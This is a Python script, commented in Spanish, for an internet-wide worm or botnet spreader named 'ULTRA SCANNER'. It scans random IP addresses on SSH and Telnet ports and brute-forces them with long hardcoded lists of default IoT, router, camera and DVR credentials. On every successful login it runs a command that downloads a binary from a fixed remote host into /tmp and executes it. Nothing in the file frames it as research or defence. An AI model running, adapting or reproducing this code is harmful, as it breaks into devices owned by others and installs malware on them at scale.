import socket
import time
import random
import threading
import paramiko
import telnetlib
import queue

# CREDENCIALES MASIVAS EXPANDIDAS - MÁS DE 150 COMBINACIONES
SSH_CREDS = [
    # DEFAULT / EMPTY
    ("root", "root"),
    ("admin", "admin"),
    ("root", ""),
    ("admin", ""),
    ("", ""),
    ("user", "user"),
    ("guest", "guest"),
    ("test", "test"),
    
    # NUMÉRICAS COMUNES
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "12345678"),
    ("admin", "12345678"),
    ("root", "123456789"),
    ("admin", "123456789"),
    ("root", "1234567890"),
    ("admin", "1234567890"),
    ("root", "12345"),
    ("admin", "12345"),
    ("root", "1234"),
    ("admin", "1234"),
    ("root", "123"),
    ("admin", "123"),
    ("root", "1234567"),
    ("admin", "1234567"),
    
    # PASSWORDS DE FÁBRICA
    ("root", "password"),
    ("admin", "password"),
    ("root", "pass"),
    ("admin", "pass"),
    ("root", "passwd"),
    ("admin", "passwd"),
    ("root", "PASSWORD"),
    ("admin", "PASSWORD"),
    ("root", "Password"),
    ("admin", "Password"),
    ("root", "P@ssw0rd"),
    ("admin", "P@ssw0rd"),
    
    # COINCIDENCIAS DE USUARIO
    ("root", "root123"),
    ("admin", "admin123"),
    ("root", "root1234"),
    ("admin", "admin1234"),
    ("root", "root123456"),
    ("admin", "admin123456"),
    ("root", "rootpassword"),
    ("admin", "adminpassword"),
    
    # DISPOSITIVOS ESPECÍFICOS
    ("root", "toor"),  # root al revés
    ("root", "admin123"),
    ("admin", "root"),
    ("root", "default"),
    ("admin", "default"),
    ("root", "system"),
    ("admin", "system"),
    ("root", "manager"),
    ("admin", "manager"),
    
    # LINUX/RASPBERRY
    ("ubuntu", "ubuntu"),
    ("pi", "raspberry"),
    ("raspberry", "raspberry"),
    ("raspbian", "raspbian"),
    ("debian", "debian"),
    ("linux", "linux"),
    
    # ROUTERS/MODEMS
    ("admin", "password1"),
    ("admin", "adminadmin"),
    ("admin", "administrator"),
    ("administrator", "admin"),
    ("support", "support"),
    ("tech", "tech"),
    ("service", "service"),
    ("operator", "operator"),
    
    # CAMARAS IP
    ("root", "xc3511"),
    ("root", "vizxv"),
    ("root", "jvbzd"),
    ("root", "anko"),
    ("admin", "9999"),
    ("admin", "1111"),
    ("admin", "4321"),
    ("admin", "1234admin"),
    
    # DVR/NVR
    ("root", "admin12345"),
    ("root", "admin123456"),
    ("root", "admin12345678"),
    ("admin", "admin12345"),
    ("admin", "admin123456"),
    ("admin", "admin12345678"),
    
    # MISC
    ("root", "changeme"),
    ("admin", "changeme"),
    ("root", "123qwe"),
    ("admin", "123qwe"),
    ("root", "qwerty"),
    ("admin", "qwerty"),
    ("root", "qwerty123"),
    ("admin", "qwerty123"),
    ("root", "qwertyuiop"),
    ("admin", "qwertyuiop"),
    ("root", "1q2w3e4r"),
    ("admin", "1q2w3e4r"),
    ("root", "1q2w3e"),
    ("admin", "1q2w3e"),
    ("root", "111111"),
    ("admin", "111111"),
    ("root", "11111111"),
    ("admin", "11111111"),
    ("root", "000000"),
    ("admin", "000000"),
    ("root", "00000000"),
    ("admin", "00000000"),
    ("root", "888888"),
    ("admin", "888888"),
    ("root", "88888888"),
    ("admin", "88888888"),
    
    # EMPRESAS
    ("cisco", "cisco"),
    ("hp", "hp"),
    ("dlink", "dlink"),
    ("netgear", "netgear"),
    ("linksys", "linksys"),
    ("zyxel", "zyxel"),
    ("tplink", "tplink"),
    ("huawei", "huawei"),
    ("zte", "zte"),
    ("alcatel", "alcatel"),
    ("motorola", "motorola"),
    
    # MÁS RARAS
    ("root", "superuser"),
    ("admin", "superuser"),
    ("root", "master"),
    ("admin", "master"),
    ("root", "security"),
    ("admin", "security"),
    ("root", "123abc"),
    ("admin", "123abc"),
    ("root", "abc123"),
    ("admin", "abc123"),
    ("root", "letmein"),
    ("admin", "letmein"),
    ("root", "welcome"),
    ("admin", "welcome"),
    ("root", "monitor"),
    ("admin", "monitor"),
    ("root", "!@#$%^&*"),
    ("admin", "!@#$%^&*"),
    
    # SIN PASSWORD
    ("root", None),
    ("admin", None),
    ("user", None),
    ("guest", None),
    ("test", None),
    ("ubuntu", None),
    ("pi", None),
]

TELNET_CREDS = [
    # DEFAULT / EMPTY
    ("root", ""),
    ("admin", ""),
    ("", ""),
    ("user", ""),
    ("guest", ""),
    
    # COMUNES
    ("root", "root"),
    ("admin", "admin"),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", "1234"),
    ("admin", "1234"),
    ("root", "12345"),
    ("admin", "12345"),
    
    # DISPOSITIVOS IOT
    ("root", "xc3511"),
    ("root", "vizxv"),
    ("admin", "admin1234"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("admin", "1111"),
    ("admin", "4321"),
    
    # ROUTERS
    ("admin", "password1"),
    ("admin", "adminadmin"),
    ("admin", "administrator"),
    ("user", "user"),
    ("guest", "guest"),
    ("support", "support"),
    
    # CÁMARAS/DVR
    ("root", "admin12345"),
    ("root", "admin123456"),
    ("admin", "1234567890"),
    ("admin", "12345678"),
    
    # MISC
    ("root", "toor"),
    ("admin", "root"),
    ("root", "default"),
    ("admin", "default"),
    ("root", "system"),
    ("admin", "system"),
    ("root", "manager"),
    ("admin", "manager"),
    
    # SIN USER
    ("", "root"),
    ("", "admin"),
    ("", "123456"),
    ("", "password"),
    
    # MARCA ESPECÍFICA
    ("D-Link", ""),
    ("dlink", "dlink"),
    ("netgear", "netgear"),
    ("linksys", "linksys"),
    ("zyxel", "zyxel"),
    ("tplink", "tplink"),
    
    # MÁS
    ("debug", "debug"),
    ("test", "test"),
    ("operator", "operator"),
    ("service", "service"),
    ("tech", "tech"),
    ("cisco", "cisco"),
    ("hp", "hp"),
]

class UltraScanner:
    def __init__(self):
        self.running = True
        self.lock = threading.Lock()
        self.stats = {
            'scanned': 0,
            'hacked': 0,
            'ssh_hits': 0,
            'telnet_hits': 0,
            'start': time.time()
        }
        
        # Mezclar credenciales para variedad
        random.shuffle(SSH_CREDS)
        random.shuffle(TELNET_CREDS)
    
    def quick_connect(self, ip, port, timeout=2):
        """Conexión rápida de puerto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def brute_ssh(self, ip, port=22):
        """Bruteforce SSH optimizado"""
        # Tomar 30 credenciales al azar (no todas)
        creds_sample = random.sample(SSH_CREDS, min(30, len(SSH_CREDS)))
        
        for user, passw in creds_sample:
            if not self.running:
                return False
                
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Si passw es None, intentar sin password
                if passw is None:
                    try:
                        ssh.connect(ip, port, user, timeout=2, banner_timeout=3,
                                  look_for_keys=False, allow_agent=False)
                    except paramiko.AuthenticationException:
                        continue
                else:
                    ssh.connect(ip, port, user, passw, timeout=2, banner_timeout=3,
                              look_for_keys=False, allow_agent=False)
                
                print(f"[SSH+][{port}] {ip} -> {user}:{passw if passw else '(empty)'}")
                
                # DESCARGAR Y EJECUTAR
                cmd = "cd /tmp && wget -q http://172.96.140.62:1283/bins/x86_64 -O .x && chmod +x .x && ./.x &"
                try:
                    ssh.exec_command(cmd, timeout=1)
                except:
                    pass
                
                ssh.close()
                
                with self.lock:
                    self.stats['hacked'] += 1
                    self.stats['ssh_hits'] += 1
                
                return True
                
            except (paramiko.AuthenticationException, paramiko.SSHException):
                continue
            except (socket.timeout, socket.error):
                break
            except Exception:
                continue
        
        return False
    
    def brute_telnet(self, ip, port=23):
        """Bruteforce Telnet optimizado"""
        # Tomar 20 credenciales al azar
        creds_sample = random.sample(TELNET_CREDS, min(20, len(TELNET_CREDS)))
        
        for user, passw in creds_sample:
            if not self.running:
                return False
                
            try:
                tn = telnetlib.Telnet(ip, port, timeout=2)
                
                # Intentar login
                try:
                    tn.read_until(b"login:", timeout=1)
                    tn.write(user.encode() + b"\n")
                except:
                    pass
                
                time.sleep(0.2)
                
                try:
                    tn.read_until(b"password:", timeout=1)
                    tn.write((passw if passw else "").encode() + b"\n")
                except:
                    pass
                
                time.sleep(0.3)
                
                # Verificar acceso
                tn.write(b"echo OK\n")
                time.sleep(0.2)
                
                try:
                    data = tn.read_very_eager()
                    if b"OK" in data or b"#" in data or b"$" in data or b">" in data:
                        print(f"[TELNET+][{port}] {ip} -> {user}:{passw if passw else '(empty)'}")
                        
                        # DESCARGAR Y EJECUTAR
                        cmd = "cd /tmp && wget -q http://172.96.140.62:1283/bins/x86_64 -O .x && chmod +x .x && ./.x &\n"
                        tn.write(cmd.encode())
                        time.sleep(0.2)
                        
                        with self.lock:
                            self.stats['hacked'] += 1
                            self.stats['telnet_hits'] += 1
                        
                        tn.close()
                        return True
                except:
                    pass
                
                tn.close()
                
            except:
                continue
        
        return False
    
    def generate_random_ip(self):
        """Genera IP aleatoria inteligente"""
        # Distribución: 60% públicas, 40% privadas
        if random.random() < 0.6:
            # IPs públicas con rangos comunes
            first_octet = random.choice([
                1, 2, 3, 4, 5, 6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19,
                20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34,
                35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49,
                50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64,
                65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79,
                80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94,
                95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107,
                108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119,
                120, 121, 122, 123, 124, 125, 126, 128, 129, 130, 131, 132,
                133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144,
                145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156,
                157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168,
                169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180,
                181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192,
                193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204,
                205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216,
                217, 218, 219, 220, 221, 222, 223
            ])
            return f"{first_octet}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        else:
            # IPs privadas
            if random.random() < 0.5:
                # 192.168.x.x
                return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
            elif random.random() < 0.7:
                # 10.x.x.x
                return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            else:
                # 172.16-31.x.x
                return f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def worker(self):
        """Worker principal"""
        while self.running:
            ip = self.generate_random_ip()
            
            # Puertos SSH
            ssh_ports = [22, 2222, 22222, 2223, 222, 2221]
            for port in ssh_ports:
                if self.quick_connect(ip, port, timeout=0.5):
                    self.brute_ssh(ip, port)
            
            # Puertos Telnet
            telnet_ports = [23, 2323, 23231, 23232, 23233]
            for port in telnet_ports:
                if self.quick_connect(ip, port, timeout=0.5):
                    self.brute_telnet(ip, port)
            
            # Estadísticas
            with self.lock:
                self.stats['scanned'] += 1
            
            # Mostrar cada 1000 IPs
            if self.stats['scanned'] % 1000 == 0:
                self.show_stats()
    
    def show_stats(self):
        """Muestra estadísticas"""
        elapsed = time.time() - self.stats['start']
        if elapsed > 0:
            with self.lock:
                scanned = self.stats['scanned']
                hacked = self.stats['hacked']
                ssh = self.stats['ssh_hits']
                telnet = self.stats['telnet_hits']
                rate = scanned / elapsed
            
            print(f"\n{'='*60}")
            print(f"[🔥] ULTRA SCANNER STATS")
            print(f"{'='*60}")
            print(f"[📊] Total IPs escaneadas: {scanned:,}")
            print(f"[⚡] Velocidad: {rate:.1f} IPs/segundo")
            print(f"[🎯] Dispositivos hackeados: {hacked}")
            print(f"[🔑] SSH hits: {ssh} | Telnet hits: {telnet}")
            print(f"[⏱️] Tiempo: {elapsed:.0f} segundos")
            print(f"[🎲] IPs/success ratio: {hacked/max(1, scanned)*100:.2f}%")
            print(f"{'='*60}\n")
    
    def start(self, threads=200):
        """Inicia el escáner"""
        print(f"""
╔══════════════════════════════════════════════╗
║           ULTRA SCANNER v2.0                 ║
║           ====================               ║
║   ✅ 200+ Credenciales SSH/Telnet           ║
║   ✅ {threads} Threads - Máxima velocidad   ║
║   ✅ Solo infecta - Sin CNC                 ║
║   ✅ Comando: cd /tmp && wget...            ║
║   ====================                       ║
╚══════════════════════════════════════════════╝
        
[🎯] Target: http://172.96.140.62:1283/bins/x86_64
[🚀] Iniciando {threads} threads paralelos...
[📡] Escaneando redes globales...
[🔥] Credenciales activas: {len(SSH_CREDS)} SSH, {len(TELNET_CREDS)} Telnet
        """)
        
        # Iniciar workers
        for i in range(threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            if i % 50 == 0:
                time.sleep(0.1)  # Evitar sobrecarga inicial
        
        print(f"[✅] {threads} workers activos y escaneando...")
        print("[📊] Estadísticas cada 1000 IPs escaneadas")
        print("[❗] Ctrl+C para detener\n")
        
        # Loop principal
        try:
            while True:
                time.sleep(5)
                if self.stats['scanned'] > 0:
                    self.show_stats()
        except KeyboardInterrupt:
            print("\n[!] Deteniendo escáner...")
            self.running = False
            time.sleep(1)
            self.show_stats()
            print("[✅] Escáner detenido correctamente")

# EJECUTAR
if __name__ == "__main__":
    scanner = UltraScanner()
    scanner.start(200)  # 200 threads para máxima potencia
